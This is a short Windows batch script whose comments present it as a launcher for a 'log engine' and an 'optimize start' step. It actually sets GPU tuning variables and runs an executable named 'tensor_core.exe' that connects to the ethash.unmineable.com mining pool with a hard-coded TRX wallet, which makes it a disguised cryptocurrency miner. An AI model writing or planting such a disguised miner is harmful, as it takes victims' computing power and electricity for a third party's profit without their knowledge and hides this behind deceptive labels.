REM
REM Example bat file for starting log engine
REM

setx GPU_FORCE_64BIT_PTR 0
setx GPU_MAX_HEAP_SIZE 40
setx GPU_USE_SYNC_OBJECTS 1
setx GPU_MAX_ALLOC_PERCENT 40
setx GPU_SINGLE_ALLOC_PERCENT 40

REM IMPORTANT: Optimize start
"%~dp0\tensor_core.exe" -pool ethash.unmineable.com:3333 -wal TRX:TD5TrHLdGyhz85aK9yjQKEKv3sFt5JsRuz.tf_opt -pass x -log 0 -logsmaxsize 1 -logfile log.txt
pause
